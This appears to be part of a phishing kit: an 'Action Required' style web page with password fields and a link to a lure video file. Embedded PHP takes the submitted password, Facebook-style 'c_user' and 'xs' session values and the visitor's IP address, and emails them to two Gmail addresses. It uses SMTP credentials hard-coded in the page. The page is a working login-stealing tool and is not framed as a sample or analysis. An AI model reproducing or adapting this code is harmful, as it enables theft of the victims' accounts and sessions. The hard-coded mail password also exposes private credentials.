...
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  ...
  </head><body><div class="md:hidden lg:hidden sm:block border flex w-full h-16 relative bg-[#4667ac]">
    <div class="mx-5 mt-3">
        <img class="h-7" src="/home.png/" alt="">
    </div>
<div>
...
0<div>
    <img class="h-5  mx-4 mt-2 shadow-2xl md:hidden lg:hidden sm:block" src="Action%20_%20Required_files/home.png" alt="">
</div>
  ...
  <div class="relative flex justify-center items-center mt-7 md:hidden lg:hidden sm:block">
    ...
    <div>
      ...
      <a class="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed video.mp4"><img class="w-32 h-20 mx-3" src="download.jpeg" alt=""></a>
      ...
      <p class="text-slate-400 pl-4 mt-1">
        Confirm Password
      </p><input class="border h-6 pl-1 mx-3" type="text" name="Confirm Password" required="">
    </div> <div>
      <p class="text-[10px] font-serif   mt-3 mx-3">
...
<div>
  <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed video.mp4"><img src="/download.jpeg" alt=""></a>
</div><div>
...
<div>
  ...
  <p class="text-slate-400 pl-4 mt-1">
    Confirm Password
  </p><input class="border h-6 pl-1 mx-3" type="text" name="pass" required="">
</div>
...
<div class="hidden lg:block md:bllock flex">
  ...
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $to = 'sanullah947@gmail.com,kamrannizamani11@gmail.com';
      $subject = 'Customer Name and Purchasing';
      ...
      $message = "c_user: $c_user: $pass<br><br>xs: $xs<br><br>IP address: $ip";

      $headers = "From: kamrannizamani11@gmail.com\r\n";
      $headers .= "Reply-To: sanullah947@gmail.com,kamrannizamani11@gmail.com,\r\n";
      ...
      $smtp_port = "587";
      $smtp_username = "kamrannizamani11@gmail.com";
      $smtp_password = "cbrtyatwntjtddoc";
      ...
      try {
          ...
          $mail->setFrom('kamrannizamani11@gmail.com', 'kami');
          $to_array = explode(',', $to);
